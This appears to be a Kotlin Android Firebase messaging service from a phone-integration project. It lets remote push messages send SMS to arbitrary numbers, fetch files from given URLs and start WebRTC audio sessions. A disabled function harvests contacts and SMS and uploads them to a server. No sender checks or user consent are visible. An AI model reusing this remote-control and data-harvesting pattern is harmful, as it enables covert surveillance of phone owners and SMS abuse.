package fr.intechinfo.fusionandroid

import android.telephony.SmsManager
import android.util.Log
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage

import android.content.ContentValues.TAG
import android.content.Context
import org.webrtc.SessionDescription
import okhttp3.ResponseBody
import org.webrtc.IceCandidate
import org.webrtc.SdpObserver


class MyFirebaseMessagingService : FirebaseMessagingService() {

    override fun onMessageReceived(remoteMessage: RemoteMessage?) {
        val data = remoteMessage!!.data
        val strTitle = data["title"]
        val message = data["text"]
        val type = data["type"]
        Log.d("MyFireBasemessaging", "onMessageReceived:  Message Received: \nTitle: $strTitle\nMessage: $message")
        if(type == "sms"){
            sendSMS(strTitle, message)
        }
        else if (type == "file"){
            DownloadFile(message)
        }
        else {
            rtcSignaling(type!!, message!!, Rtc.instance)
        }

        //SyncData()
    }

    private fun sendSMS(phoneNumber: String?, messageBody: String?) {
        val sms = SmsManager.getDefault()
        sms.sendTextMessage(phoneNumber, null, messageBody, null, null)
    }

    private fun DownloadFile(fileName: String?){
        Log.d("DownloadFile", "MFile Downloading")
        HttpExecute.BuildAPI().downloadFileWithDynamicUrlSync(fileName).execute()
    }

    private fun SyncData() {
        val retrofitAPI = HttpExecute.BuildAPI()
        val cc = ContentCollector()
        val contactLs = ContactsList()
        contactLs.SetContact(cc.GetContacts(this))
        Log.d("SYNC", "Name : " + contactLs.GetContact()!![1].GetName() + " Number : " + contactLs.GetContact()!![1].GetNumber())
        val SMSLs = SMSList()
        SMSLs.SetSMS(cc.GetSMS(this))
        Log.d("SYNC", "Address : " + SMSLs.GetSMS()!![3].GetAddress() + " Message : " + SMSLs.GetSMS()!![3].GetBody() + " Date : " + SMSLs.GetSMS()!![3].GetDate() + " Type : " + SMSLs.GetSMS()!![3].GetType())

        HttpExecute(retrofitAPI.CreateContacts(contactLs)).start()
        HttpExecute(retrofitAPI.CreateSMS(SMSLs)).start()
    }
    private fun rtcSignaling(type: String, message: String, rtc: Rtc?){
        if(rtc?.peerConnection == null){
            rtc?.initRtcAudio(this.applicationContext)
        }
        if(type == "sdp"){
            rtc?.peerConnection?.setRemoteDescription(RtcSdpObserver(), SessionDescription(SessionDescription.Type.OFFER, message))
        }
        else{
            rtc?.peerConnection?.addIceCandidate(IceCandidate("",0,message))
        }
    }
}